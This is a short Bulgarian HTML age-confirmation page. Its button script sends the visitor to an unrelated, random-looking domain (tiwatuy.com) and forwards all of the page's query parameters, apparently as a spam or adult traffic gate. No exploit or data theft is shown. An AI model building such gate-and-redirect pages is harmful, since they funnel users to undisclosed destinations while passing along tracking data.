<!DOCTYPE html>
<html lang="bg">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Потвърждение на възраст</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      font-family: Arial, sans-serif;
    }

    .card {
      background: #e8e8e8;
      border-radius: 16px;
      padding: 40px 36px;
      max-width: 420px;
      width: 90%;
      text-align: center;
    }

    .card p {
      font-size: 18px;
      color: #222;
      margin-bottom: 28px;
      line-height: 1.5;
    }

    .btn {
      display: inline-block;
      background: #f5c800;
      color: #222;
      font-size: 16px;
      font-weight: 600;
      padding: 14px 40px;
      border-radius: 8px;
      text-decoration: none;
      cursor: pointer;
    }

    .btn:hover { background: #e0b400; }
  </style>
</head>
<body>

<div class="card">
  <p>Моля, потвърдете, че сте навършили 18 години</p>
  <a href="#" class="btn" id="confirm-btn">Потвърждавам</a>
</div>

<script>
  document.getElementById('confirm-btn').addEventListener('click', function(e) {
    e.preventDefault();
    var dest = new URL('https://tiwatuy.com/');
    new URLSearchParams(window.location.search).forEach(function(val, key) {
      dest.searchParams.set(key, val);
    });
    window.location.href = dest.toString();
  });
</script>

</body>
</html>
